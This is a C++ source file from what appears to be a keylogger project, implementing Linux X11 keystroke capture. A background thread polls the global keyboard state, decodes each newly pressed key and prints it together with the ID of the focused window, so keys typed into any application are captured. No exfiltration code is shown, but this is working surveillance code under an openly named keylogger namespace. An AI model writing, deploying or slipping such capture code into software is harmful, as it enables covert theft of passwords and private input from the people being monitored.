#ifdef __linux__

#include "KeystrokeCapturerLinuxX11.h"

#include <cstring>

namespace Keylogger {

bool KeystrokeCapturerLinuxX11::start() {
    _display = XOpenDisplay(NULL);
    if (_display != NULL) {
        _thread = new std::thread(&KeystrokeCapturerLinuxX11::_keystrokeListener, this);
        _threadRun = true;
    }
    return _display != NULL;
}

void KeystrokeCapturerLinuxX11::stop() {
    _threadRun = false;
    XCloseDisplay(_display);
}

void KeystrokeCapturerLinuxX11::consumeKeystrokes(bool consume) {
    _consumeKeystrokes = consume;
}

void KeystrokeCapturerLinuxX11::setCallback(std::function<void(int keycode, KeyState state)> callback) {
    _callback = callback;
}

void KeystrokeCapturerLinuxX11::addLogger(ILogger* logger) {
    _loggers.push_back(logger);
}

void KeystrokeCapturerLinuxX11::_keystrokeListener() {
    char keys[32];
    char lastKeys[32] = {0};

    Window focusWin = 0;
    int revertToReturn = 0;

    while (_threadRun) {
        XQueryKeymap(_display, keys);

        if (memcmp(keys, lastKeys, 32)) {
            for (int i = 0; i < 32; i++) {
                char bit = keys[i];
                char lastBit = lastKeys[i];
                int check = 1;

                for (int j = 0 ; j < 8 ; j++) {
                    if ((bit & check) && !(lastBit & check)) {
                        int keycode = (i << 3) + j;

                        int keysym = XKeycodeToKeysym(_display, keycode, 0);
                        char* keystr = XKeysymToString(keysym);

                        XGetInputFocus(_display, &focusWin, &revertToReturn);
                        printf("WindowID %x Key: %d %d %s\n", focusWin, keycode, keysym, keystr);
                    }
                    check <<= 1;
                }
            }
        }
        memcpy(lastKeys, keys, 32);
    }
}

}

#endif // defined(__linux__)
